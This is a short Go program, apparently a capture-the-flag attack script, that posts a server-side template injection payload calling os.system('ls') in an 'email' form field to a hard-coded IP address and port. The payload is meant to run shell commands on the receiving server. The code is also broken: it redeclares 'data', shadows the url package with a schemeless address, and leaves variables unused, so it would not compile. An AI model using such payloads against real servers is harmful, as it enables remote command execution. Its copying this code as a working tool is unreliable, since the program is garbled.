package main

import (
	"net/http"
	"net/url"
	"os/user"
	"log"
	"fmt"
)
 func main() {

  url := fmt.Sprintf("94.237.59.206:42477")
	data := `{"":"value1"}`

	currentUser, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

  data := url.Values{}
	data.Set("email", "{% import os %}{{os.system('ls')}}")

	resp, err := http.PostForm(url, data)
	if err != nil {
		log.Fatal("Error sending request. ", err)
	}
	defer resp.Body.Close()

	fmt.Println("response status:", resp.Status)
}

